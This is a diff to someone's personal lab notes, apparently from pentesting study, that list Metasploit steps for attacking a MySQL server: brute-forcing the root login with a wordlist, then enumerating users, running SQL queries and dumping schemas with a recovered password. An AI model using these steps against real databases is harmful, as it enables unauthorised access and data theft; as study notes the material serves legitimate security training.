@@ -222,4 +222,30 @@ Prep: start postgresql - launch msfconsole - set up workspace - setg rhost
 	-  use mysql_login (we are after the root user)
 		- set username to root  -> set USERNAME root 
 		- set pass_file /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt 
-		- 
+		- set verbose option to false 
+
+3) perform MySQL enumeration through module MySQLenum 
+	- search mysql_enum 
+	- use aux/admin/mysql/mysql_enum 
+	- set PASSWORD twinkle 
+	- set USERNAME root 
+
+4) Use module to execute sql queries (interact with sql database)
+	- search mysql_sql 
+	- use aux/admin/mysql/mysql_sql 
+	- set PASSWORD twinkle, set USERNAME root 
+	- set SQL *show databases*;  (this will tell us what database are on there, in sql moet je ; achter elke command zetten)
+
+5) find more info about schema (display databases and its tables )
+	-  search mysql_schema 
+	- use aux/scanner/mysql/mysql_schemadump 
+	- set PASSWORD twinkle 
+	- set USERNAME root 
+	- run (hosts or services, or loot, or creds)
+![[Pasted image 20230823123501.png]]
+
+How to quickly get access to mysql database server: 
+- command: mysql -h ip -u root -p 
+- command: show databases; 
+
+
